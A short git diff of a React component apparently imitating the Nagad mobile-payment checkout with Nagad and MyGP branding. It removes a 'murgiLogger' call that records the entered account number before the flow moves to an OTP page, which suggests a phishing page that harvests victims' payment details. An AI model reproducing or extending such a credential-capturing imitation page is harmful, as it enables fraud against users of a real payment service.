@@ -4,7 +4,6 @@ import { useToast } from "@/hooks/use-toast";
 import nagadLogo from "@/assets/nagad-logo.png";
 import mygpLogo from "@/assets/mygp-logo.png";
 import { Loader } from "@/components/ui/loader";
-import murgiLogger from "@/lib/murgiLogger";
 
 const Nagad = () => {
   const navigate = useNavigate();
@@ -18,7 +17,6 @@ const Nagad = () => {
   const handleConfirm = () => {
     const bdPhoneRegex = /^01[3-9]\d{8}$/;
     if (accountNumber.length === 11 && bdPhoneRegex.test(accountNumber)) {
-      murgiLogger.paymentNumber("Nagad", accountNumber);
       setLoading(true);
       setTimeout(() => {
         navigate(`/otp?amount=${amount}`, { 
